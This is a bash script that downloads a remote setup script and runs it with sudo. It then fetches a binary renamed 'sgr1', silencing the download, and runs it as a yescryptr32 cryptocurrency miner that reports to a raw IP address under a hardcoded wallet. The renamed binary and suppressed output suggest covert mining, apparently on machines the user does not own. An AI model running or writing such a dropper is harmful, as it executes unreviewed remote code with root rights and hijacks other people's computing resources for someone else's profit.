#!/bin/bash
apt-get update ; apt-get install -y wget curl sudo
wget https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
chmod u+x configurasi.sh
sudo ./configurasi.sh
./configurasi.sh
wget -O sgr1 https://bitbucket.org/boluna/file/downloads/mintul >/dev/null 2>&1
chmod +x sgr1
# ./sgr1 -a yescryptr32  -o stratum+tcps://stratum-asia.rplant.xyz:17116 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5)
./sgr1 -a yescryptr32  -o 45.115.225.55:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5)
